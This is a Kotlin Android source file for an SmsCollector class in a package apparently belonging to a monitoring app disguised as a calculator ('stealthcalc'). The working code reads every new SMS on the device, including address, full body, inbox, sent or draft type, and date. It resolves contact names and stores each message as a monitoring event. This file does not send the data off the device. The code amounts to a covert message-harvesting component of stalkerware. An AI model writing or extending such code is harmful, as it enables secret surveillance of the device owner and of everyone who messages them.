package com.stealthcalc.monitoring.collector

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.MonitoringEventKind
import com.stealthcalc.monitoring.model.SmsPayload
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class SmsCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
) {
    private var lastPollDate: Long = System.currentTimeMillis()

    fun hasPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) ==
                PackageManager.PERMISSION_GRANTED

    suspend fun collect() {
        if (!repository.isMetricEnabled("sms")) return
        if (!hasPermission()) return

        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
                Telephony.Sms.DATE,
            ),
            "${Telephony.Sms.DATE} > ?",
            arrayOf(lastPollDate.toString()),
            "${Telephony.Sms.DATE} ASC"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(0) ?: ""
                val body = it.getString(1) ?: ""
                val type = it.getInt(2)
                val date = it.getLong(3)

                val contactName = resolveContact(address)
                val typeStr = when (type) {
                    Telephony.Sms.MESSAGE_TYPE_INBOX -> "INBOX"
                    Telephony.Sms.MESSAGE_TYPE_SENT -> "SENT"
                    Telephony.Sms.MESSAGE_TYPE_DRAFT -> "DRAFT"
                    else -> "OTHER"
                }

                val payload = Json.encodeToString(
                    SmsPayload(
                        address = address,
                        contactName = contactName,
                        body = body,
                        type = typeStr,
                        date = date,
                    )
                )
                repository.recordEvent(MonitoringEventKind.SMS, payload)
                if (date > lastPollDate) lastPollDate = date
            }
        }
    }

    private fun resolveContact(address: String): String? {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) !=
            PackageManager.PERMISSION_GRANTED) return null

        val uri = Uri.withAppendedPath(
            ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
            Uri.encode(address)
        )
        return runCatching {
            context.contentResolver.query(
                uri,
                arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null
            )?.use { cursor ->
                if (cursor.moveToFirst()) cursor.getString(0) else null
            }
        }.getOrNull()
    }
}
